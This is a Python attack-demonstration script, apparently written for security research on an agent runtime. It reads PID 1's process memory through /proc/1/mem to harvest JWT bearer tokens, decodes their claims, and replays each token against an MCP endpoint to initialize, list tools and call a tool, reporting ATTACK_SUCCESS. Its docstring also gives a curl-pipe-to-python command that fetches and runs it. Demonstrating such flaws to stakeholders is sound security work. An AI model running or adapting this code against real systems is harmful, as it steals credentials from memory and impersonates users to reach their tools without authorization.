"""Notebook-14 §4.12 — full attack demo, rich output for stakeholder review.

Lifts the JWT from /proc/1/mem and uses it as the Bearer for THREE separate
calls to the AgentCore Runtime MCP endpoint:
  1. initialize    (auth check)
  2. tools/list    (catalog enumeration)
  3. tools/call probe_echo (actual tool invocation)

Output is structured (KEY=VALUE lines) so the notebook can parse without
ambiguity, and includes:
  - SHA-256 of the lifted JWT bytes (so the notebook can prove byte-identity
    against the mcp_jwt minted in §3 — same SHA = same token)
  - Selected JWT claims (jti, sub, iat, exp, username, kid) — short strings,
    relay-safe
  - HTTP statuses + body excerpts for each of the three MCP calls

The full JWT bytes never leave the harness — only the SHA travels through
the LLM relay path, and SHAs are pure [0-9a-f] which the relay handles
losslessly.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_jwt_attack_demo.py
and fetched via `MCP_INVOKE_URL=... curl -sL <url> | python3` from the
harness shell.
"""
import base64
import hashlib
import json
import os
import re
import sys
import urllib.error
import urllib.request


JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')


def lift_jwt():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue

    seen = set()
    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue
            for m in JWT_RE.finditer(chunk):
                jwt = m.group(0)
                if len(jwt) < 200:
                    continue
                if jwt in seen:
                    continue
                seen.add(jwt)
                yield jwt


def _b64url_decode(part: bytes) -> bytes:
    pad = b'=' * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def decode_claims(jwt_bytes: bytes):
    parts = jwt_bytes.split(b'.')
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def http_post(url: str, headers: dict, body: bytes, timeout: int = 30):
    req = urllib.request.Request(url, data=body, headers=headers, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def mcp_call(url: str, jwt_bytes: bytes, method: str, params: dict, request_id: int):
    body = json.dumps({
        'jsonrpc': '2.0', 'id': request_id, 'method': method, 'params': params,
    }).encode()
    headers = {
        'Authorization': b'Bearer ' + jwt_bytes,
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
    }
    return http_post(url, headers, body)


def main():
    mcp_url = os.environ.get('MCP_INVOKE_URL')
    if not mcp_url:
        print('DEMO_FAIL=missing_MCP_INVOKE_URL')
        sys.exit(1)

    print(f'DEMO_TARGET={mcp_url}')

    candidates = list(lift_jwt())
    print(f'DEMO_HEAP_JWTS_FOUND={len(candidates)}')
    if not candidates:
        print('DEMO_VERDICT=NO_CANDIDATE')
        return

    for idx, jwt_bytes in enumerate(candidates, start=1):
        print(f'\n--- DEMO_CANDIDATE[{idx}] ---')
        sha256 = hashlib.sha256(jwt_bytes).hexdigest()
        print(f'JWT[{idx}]_LEN={len(jwt_bytes)}')
        print(f'JWT[{idx}]_SHA256={sha256}')

        header, payload = decode_claims(jwt_bytes)
        if not (header and payload):
            print(f'JWT[{idx}]_DECODE=failed')
            continue

        print(f'JWT[{idx}]_KID={header.get("kid", "<missing>")}')
        print(f'JWT[{idx}]_ALG={header.get("alg", "<missing>")}')
        print(f'JWT[{idx}]_SUB={payload.get("sub", "<missing>")}')
        print(f'JWT[{idx}]_USERNAME={payload.get("username", "<missing>")}')
        print(f'JWT[{idx}]_TOKEN_USE={payload.get("token_use", "<missing>")}')
        print(f'JWT[{idx}]_CLIENT_ID={payload.get("client_id", "<missing>")}')
        print(f'JWT[{idx}]_ISS={payload.get("iss", "<missing>")}')
        print(f'JWT[{idx}]_JTI={payload.get("jti", "<missing>")}')
        print(f'JWT[{idx}]_IAT={payload.get("iat", "<missing>")}')
        print(f'JWT[{idx}]_EXP={payload.get("exp", "<missing>")}')

        # --- Attack 1: initialize ---
        status, body = mcp_call(mcp_url, jwt_bytes, 'initialize', {
            'protocolVersion': '2024-11-05',
            'capabilities': {},
            'clientInfo': {'name': 'nb14-attack-demo', 'version': '0.1'},
        }, request_id=1)
        print(f'JWT[{idx}]_INIT_STATUS={status}')
        if status != 200:
            print(f'JWT[{idx}]_INIT_BODY={body[:200]!r}')
            continue
        # body comes back as text/event-stream; pull out the JSON-RPC result
        m = re.search(rb'data:\s*({.*})', body)
        init_result = m.group(1).decode('utf-8', errors='replace') if m else ''
        print(f'JWT[{idx}]_INIT_RESULT={init_result[:300]}')

        # --- Attack 2: tools/list ---
        status, body = mcp_call(mcp_url, jwt_bytes, 'tools/list', {}, request_id=2)
        print(f'JWT[{idx}]_LIST_STATUS={status}')
        m = re.search(rb'data:\s*({.*})', body)
        list_result = m.group(1).decode('utf-8', errors='replace') if m else body[:300].decode('utf-8', errors='replace')
        # Pull tool names out of the result
        tool_names = re.findall(r'"name"\s*:\s*"([^"]+)"', list_result)
        print(f'JWT[{idx}]_LIST_TOOLS={tool_names}')

        # --- Attack 3: tools/call probe_echo ---
        status, body = mcp_call(mcp_url, jwt_bytes, 'tools/call', {
            'name': 'probe_echo',
            'arguments': {'marker': 'NB14_ATTACK_DEMO_HEAP_LIFTED_BEARER'},
        }, request_id=3)
        print(f'JWT[{idx}]_CALL_STATUS={status}')
        m = re.search(rb'data:\s*({.*})', body)
        call_result = m.group(1).decode('utf-8', errors='replace') if m else body[:300].decode('utf-8', errors='replace')
        print(f'JWT[{idx}]_CALL_RESULT={call_result[:400]}')

        if status == 200 and 'NB14_MCP_PROBE_ECHO' in call_result:
            print(f'JWT[{idx}]_VERDICT=ATTACK_SUCCESS')
        else:
            print(f'JWT[{idx}]_VERDICT=ATTACK_PARTIAL')

    print('\nDEMO_VERDICT=COMPLETE')


if __name__ == '__main__':
    main()
